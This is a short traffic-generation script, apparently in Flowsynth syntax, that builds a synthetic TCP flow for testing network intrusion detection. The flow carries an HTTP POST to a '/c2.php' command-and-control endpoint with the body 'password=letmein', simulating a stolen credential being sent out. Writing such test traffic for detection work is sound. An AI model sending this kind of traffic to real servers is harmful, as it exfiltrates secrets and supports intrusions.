flow myflow1 tcp 192.168.9.10:22301 > 10.10.10.10:80 (tcp.initialize;);

myflow1 > 	(
		content:"POST /c2.php HTTP/1.1\x0D\x0A"; 
		content:"User-Agent: Internet Exploder\x0D\x0A";
		content:"Content-Length:16\x0D\x0a"; 
		content:"\x0D\x0a";
		);

myflow1 > (content:"password=letmein";);
